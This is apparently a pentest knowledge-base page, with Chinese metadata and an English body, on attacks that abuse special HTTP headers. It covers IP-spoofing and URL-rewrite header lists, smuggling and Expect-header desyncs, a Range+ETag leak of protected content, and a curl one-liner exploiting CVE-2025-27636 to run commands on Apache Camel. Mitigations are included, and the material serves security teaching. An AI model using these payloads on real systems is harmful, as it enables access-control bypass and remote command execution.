---
attack_surface:
  - 缓存/代理逻辑
  - 协议解析差异
  - 配置缺陷
impact:
  - 信息泄露
  - 身份伪造
  - 远程代码执行
risk_level: 中
prerequisites:
  - HTTP Protocol (headers, methods, status codes)
  - Proxy/CDN Architecture
  - HTTP Request Smuggling Basics
related_techniques:
  - http-request-smuggling
  - hop-by-hop-headers
  - cache-deception
  - csp-bypass
  - waf-bypass
difficulty: 中级
tools:
  - curl
  - humble
  - seclists
---

# Special HTTP Headers — HTTP Header-Based Attack Techniques — HTTP 特殊头部攻击技术

> 关联文档：[HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Abusing Hop-by-Hop Headers](../Abusing%20hop-by-hop%20headers/README.md) · [Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [CSP Bypass](../../User%20input/HTTP%20Headers/CSP%20Bypass/README.md) · [WAF Bypass](../Proxy%20&%20WAF%20Protections%20Bypass/README.md)

---

### 知识路径

```
Special HTTP Headers (this document)
  ├── Prerequisite: HTTP/1.1 Protocol — header format, hop-by-hop vs end-to-end
  ├── Next: IP Spoofing via X-Forwarded-* → auth bypass, ACL evasion
  ├── Next: Header Name Casing Bypass → CVE-2025-27636 Apache Camel RCE
  ├── Related: HTTP Request Smuggling (CL.TE / TE.CL / 0.CL / CL.0)
  │   └── See: Proxies/HTTP Request Smuggling
  ├── Related: Abusing Hop-by-Hop Headers (Connection downgrade)
  │   └── See: Proxies/Abusing hop-by-hop headers
  ├── Related: Cache Poisoning & Cache Deception
  │   └── See: Proxies/Cache Poisoning&Cache Deception
  └── Related: CSP Bypass
      └── See: User input/HTTP Headers/CSP Bypass
```

---

# 0x01 Special HTTP Headers — Principles & Classification

## 1.1 Attack Surface Overview

HTTP headers define the metadata layer of web communication. While most headers are innocuous, certain headers — particularly those interpreted by intermediate proxies, CDNs, and load balancers — can be abused to manipulate routing, authentication, caching, and request interpretation.

**Key header categories by attack surface:**

| Category | Mechanism | Impact |
|----------|-----------|--------|
| IP/Location Rewrite | Override perceived client IP via proxy headers | Auth bypass, ACL evasion, SSRF pivot |
| Hop-by-Hop | Manipulate proxy connection semantics | Header stripping, request smuggling |
| Cache | Control cache behavior and cache keys | Cache poisoning, cache deception |
| Conditional/Range | Exploit ETag and byte-range logic | Information disclosure, data exfiltration |
| Security | Configure browser security policies | Misconfiguration → XSS, clickjacking, Spectre |
| Header Casing | Exploit case-sensitive header filtering | Filter bypass → RCE |

## 1.2 Wordlists & Tools

- [SecLists http-request-headers](https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/Web/http-request-headers) — Comprehensive header wordlist
- [humble](https://github.com/rfc-st/humble) — HTTP header fuzzing tool

---

# 0x02 IP & Location Rewrite Headers

## 2.1 Mechanism

Proxies, load balancers, and CDNs often append headers indicating the original client IP. Applications may trust these headers for authentication, rate limiting, or access control decisions. An attacker can **spoof** these headers to impersonate a trusted IP (e.g., `127.0.0.1` for internal-only endpoints).

## 2.2 IP Spoofing Headers

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
Via: 1.0 fred, 1.1 127.0.0.1
Connection: close, X-Forwarded-For
```

> **Note:** `Connection: close, X-Forwarded-For` exploits hop-by-hop header behavior — see §3.1 and [Abusing Hop-by-Hop Headers](../Abusing%20hop-by-hop%20headers/README.md).

## 2.3 URL/Location Rewrite Headers

These headers override the requested URL path, enabling access to hidden or protected endpoints:

```
X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console
```

When a reverse proxy or middleware uses these headers to route requests, spoofing them can bypass path-based access controls.

---

# 0x03 Hop-by-Hop Headers & Request Smuggling

## 3.1 Hop-by-Hop Headers

A **hop-by-hop header** is designed to be processed and consumed by the proxy currently handling the request, as opposed to an **end-to-end header** which is intended for the final destination.

The `Connection` header controls which headers are treated as hop-by-hop:

```
Connection: close, X-Forwarded-For
```

This causes the proxy to strip `X-Forwarded-For` before forwarding. Conversely, omitting hop-by-hop headers that a proxy expects can cause unexpected forwarding behavior.

> **Deep dive:** [Abusing Hop-by-Hop Headers](../Abusing%20hop-by-hop%20headers/README.md)

## 3.2 HTTP Request Smuggling Headers

Core smuggling headers:

```
Content-Length: 30
Transfer-Encoding: chunked
```

Variations in how front-end proxies and back-end servers parse `Content-Length` vs `Transfer-Encoding` create desynchronization opportunities exploited in [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md).

## 3.3 The Expect Header

### 3.3.1 Normal Behavior

The `Expect: 100-continue` header allows a client to ask the server: "I'm about to send a large body — are you ready?" The server responds with `HTTP/1.1 100 Continue` before the client transmits the body.

### 3.3.2 Observed Anomalies

Multiple unexpected behaviors have been observed with `Expect: 100-continue`:

- **HEAD + body hang:** Sending a HEAD request with a body — the server didn't account for HEAD requests having no body and kept the connection open until timeout.
- **Random data leak:** Some servers sent extraneous data including random bytes from the socket buffer, secret keys, or prevented front-end header stripping.
- **0.CL desync:** The backend responded with a 400 instead of 100, but the front-end proxy was prepared to send the body — the backend interpreted the body as a new request.
- **Expect variant desync:** Sending `Expect: y 100-continue` (non-standard variant) also triggered 0.CL desynchronization.
- **CL.0 desync:** When the backend responded with a 404, the malicious request's `Content-Length` caused the backend to consume the next victim's request bytes as the body. The backend sends two responses (404 for malicious + victim response), but the front-end only expects one response — the second response is paired with a subsequent victim request, creating a persistent response queue desynchronization.

> **Full coverage:** [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md)

---

# 0x04 Cache Headers

## 4.1 Server-Side Cache Indicators

| Header | Purpose | Attack Relevance |
|--------|---------|-----------------|
| `X-Cache: miss` / `X-Cache: hit` | Indicates whether response was served from cache | Reconnaissance — identifies cacheable resources |
| `Cf-Cache-Status` | Cloudflare-specific cache status | Same as `X-Cache` for Cloudflare |
| `Cache-Control: public, max-age=1800` | Defines caching policy and TTL | Cache poisoning target — override cache duration |
| `Vary` | Specifies additional headers that form part of the cache key | Cache key manipulation — adding unkeyed headers to Vary |
| `Age: 1800` | Seconds since object was cached | Cache timing analysis |
| `Server-Timing: cdn-cache; desc=HIT` | CDN-level cache status in Server-Timing format | Alternative cache detection |

## 4.2 Client-Side / Local Cache Headers

| Header | Purpose |
|--------|---------|
| `Clear-Site-Data: "cache", "cookies"` | Instructs browser to clear specified storage types |
| `Expires: Wed, 21 Oct 2015 07:28:00 GMT` | Absolute expiration timestamp |
| `Pragma: no-cache` | Legacy equivalent of `Cache-Control: no-cache` |
| `Warning: 110 anderson/1.3.37 "Response is stale"` | Indicates potential issues with cached response status |

> **Deep dive:** [Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md)

---

# 0x05 Conditional & Range Request Headers

## 5.1 Conditional Headers (If-* Family)

| Request Header | Response Header | Behavior |
|---------------|-----------------|----------|
| `If-Modified-Since` | `Last-Modified` | Return content only if modified after the given date |
| `If-Unmodified-Since` | `Last-Modified` | Return content only if NOT modified after the given date |
| `If-Match` | `ETag` | Return content only if ETag matches |
| `If-None-Match` | `ETag` | Return content only if ETag does NOT match |

The `ETag` value is typically calculated based on response content. For example:
```
ETag: W/"37-eL2g8DEyqntYlaLp5XLInBWsjWI"
```
Indicates the ETag is the **SHA1 of 37 bytes**.

## 5.2 Range Request Headers

| Header | Purpose |
|--------|---------|
| `Accept-Ranges: bytes` | Indicates server supports range requests |
| `Range: bytes=80-100` | Requests specific byte range; returns 206 Partial Content |
| `If-Range` | Conditional range — only fulfilled if ETag/date matches |
| `Content-Range` | Indicates position of partial content within full body |

> **Tip:** Remove `Accept-Encoding` from the request when using `Range` to avoid compressed responses interfering with byte-range calculations.

### 5.2.1 Information Disclosure via Range + ETag

A critical information leak exists when `Range` and `ETag` are combined in HEAD requests against protected resources (401/403):

```http
HEAD /protected/resource HTTP/1.1
Host: target.com
Range: bytes=20-20
```

Response:
```http
HTTP/1.1 206 Partial Content
ETag: W/"1-eoGvPlkaxxP4HqHv6T3PNhV9g3Y"
```

The `ETag` reveals the **SHA1 hash of byte 20** of the protected resource. By iterating through byte positions, an attacker can reconstruct the content of access-restricted pages byte by byte — without ever receiving the body.

## 5.3 Message Body Metadata

| Header | Purpose | Security Relevance |
|--------|---------|-------------------|
| `Content-Length` | Body size in bytes | Request smuggling, information disclosure |
| `Content-Type` | Media type of resource | MIME confusion attacks |
| `Content-Encoding` | Compression algorithm | Bypass via compression oracle |
| `Content-Language` | Intended human language | Content negotiation abuse |
| `Content-Location` | Alternate location for returned data | Open redirect, SSRF |

> **Note:** While usually benign, these headers become security-relevant when accessible on 401/403-protected resources — combined with Range+ETag techniques they can leak content metadata without authorization.

---

# 0x06 Security Headers

## 6.1 Content Security Policy (CSP)

CSP controls which resources can be loaded and executed. Misconfiguration enables XSS. Full coverage in [CSP Bypass](../../User%20input/HTTP%20Headers/CSP%20Bypass/README.md).

## 6.2 Trusted Types

Enforced through CSP, Trusted Types prevent DOM XSS by requiring specifically crafted objects for dangerous DOM API calls:

```javascript
// Feature detection
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Name and create a policy
  const policy = trustedTypes.createPolicy('escapePolicy', {
    createHTML: str => str.replace(/\</g, '&lt;').replace(/>/g, '&gt;');
  });
}
```

```javascript
// Assignment of raw strings is blocked, ensuring safety.
el.innerHTML = "some string" // Throws an exception.
const escaped = policy.createHTML("<img src=x onerror=alert(1)>")
el.innerHTML = escaped // Results in safe assignment.
```

## 6.3 Other Security Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `X-Content-Type-Options` | `nosniff` | Prevents MIME type sniffing → blocks XSS via mis-typed resources |
| `X-Frame-Options` | `DENY` / `SAMEORIGIN` | Prevents clickjacking by restricting frame embedding |
| `Cross-Origin-Resource-Policy` | `same-origin` | Controls which sites can load this resource (mitigates cross-site leaks) |
| `Access-Control-Allow-Origin` | `<origin>` | CORS: allows cross-origin access from specified origin |
| `Access-Control-Allow-Credentials` | `true` | CORS: allows credentialed cross-origin requests |
| `Cross-Origin-Embedder-Policy` | `require-corp` | Controls cross-origin resource embedding (Spectre mitigation) |
| `Cross-Origin-Opener-Policy` | `same-origin-allow-popups` | Controls cross-origin window interaction (Spectre mitigation) |
| `Strict-Transport-Security` | `max-age=3153600` | Forces HTTPS connections for the domain |

## 6.4 Permissions-Policy (formerly Feature-Policy)

`Permissions-Policy` selectively enables or disables browser features and APIs, reducing the attack surface exposed to XSS or malicious iframes:

```
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

**Common directives:**

| Directive | Description |
|-----------|-------------|
| `accelerometer` | Accelerometer sensor access |
| `camera` | Video input (webcam) access |
| `geolocation` | Geolocation API access |
| `gyroscope` | Gyroscope sensor access |
| `magnetometer` | Magnetometer sensor access |
| `microphone` | Audio input access |
| `payment` | Payment Request API access |
| `usb` | WebUSB API access |
| `fullscreen` | Fullscreen API access |
| `autoplay` | Media autoplay control |
| `clipboard-read` | Read clipboard content |
| `clipboard-write` | Write to clipboard |

**Syntax:**

| Value | Effect |
|-------|--------|
| `()` | Disables the feature entirely |
| `(self)` | Allows only same-origin use |
| `*` | Allows all origins |
| `(self "https://example.com")` | Allows same-origin plus specified domain |

**Example configurations:**

```
# Restrictive — disable most features
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()

# Allow camera only from same origin
Permissions-Policy: camera=(self)

# Allow geolocation for same origin and a trusted partner
Permissions-Policy: geolocation=(self "https://maps.example.com")
```

> **Security impact:** Missing or overly permissive `Permissions-Policy` headers allow attackers (via XSS or embedded iframes) to abuse powerful browser features. Always restrict to the minimum necessary.

---

# 0x07 Header Name Casing Bypass

## 7.1 Mechanism

HTTP/1.1 defines header field-names as **case-insensitive** (RFC 9110 §5.1). However, custom middleware, security filters, or business logic frequently compare the **literal** header name without normalizing casing first. If checks are performed **case-sensitively**, an attacker bypasses them by sending the same header with different capitalization.

Typical vulnerable patterns:

- Custom allow/deny lists blocking "dangerous" internal headers before they reach sensitive components
- In-house reverse-proxy pseudo-header sanitization (e.g., `X-Forwarded-For` filtering)
- Frameworks exposing management/debug endpoints that rely on header names for authentication or command selection

## 7.2 Exploitation Pattern

1. Identify a header that is filtered or validated server-side (source code, documentation, error messages)
2. Send the **same header with different casing** (mixed-case or upper-case) — HTTP stacks canonicalize headers only **after** user code runs, so the vulnerable check is skipped
3. The downstream component treats headers case-insensitively (as most do) and accepts the attacker-controlled value

## 7.3 CVE-2025-27636 — Apache Camel `exec` RCE

In vulnerable versions of Apache Camel, the *Command Center* routes attempt to block untrusted requests by stripping the headers `CamelExecCommandExecutable` and `CamelExecCommandArgs`. The comparison used `equals()` — only the exact lowercase names were removed.

```bash
# Bypass the filter by using mixed-case header names and execute 'ls /' on the host
curl "http://<IP>/command-center" \
  -H "CAmelExecCommandExecutable: ls" \
  -H "CAmelExecCommandArgs: /"
```

The headers reach the `exec` component unfiltered, resulting in **remote command execution** with the privileges of the Camel process.

## 7.4 Detection & Mitigation

- **Normalize** all header names to a single case (usually lowercase) **before** performing allow/deny comparisons
- Reject suspicious duplicates: if both `Header:` and `HeAdEr:` are present, treat as an anomaly
- Use a **positive allow-list** enforced **after** canonicalization
- Protect management endpoints with authentication and network segmentation

---

# 0x08 Server Info & Controls

## 8.1 Server Information Headers

```
Server: Apache/2.4.1 (Unix)
X-Powered-By: PHP/5.3.3
```

These expose exact software versions, aiding targeted exploitation. Strip or obfuscate in production.

## 8.2 Control Headers

- **`Allow: GET, POST, HEAD`** — Communicates supported HTTP methods for a resource. Reconnaissance value: identifies writable endpoints (PUT, DELETE enabled).
- **`Expect: 100-continue`** — Client expectation signaling before large body transmission. See §3.3 for smuggling and desync behaviors.

## 8.3 Content-Disposition

The `Content-Disposition` header controls whether a file is displayed inline or downloaded:

```
Content-Disposition: attachment; filename="filename.jpg"
```

---

## 参考资料

- [OffSec Blog — CVE-2025-27636: RCE in Apache Camel via Header Casing Bypass](https://www.offsec.com/blog/cve-2025-27636/)
- [MDN — Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)
- [MDN — HTTP Headers Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [web.dev — Security Headers](https://web.dev/security-headers/)
- [web.dev — Security Headers (Articles)](https://web.dev/articles/security-headers)
- [SecLists — HTTP Request Headers Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/Web/http-request-headers)
- [humble — HTTP Header Fuzzer](https://github.com/rfc-st/humble)
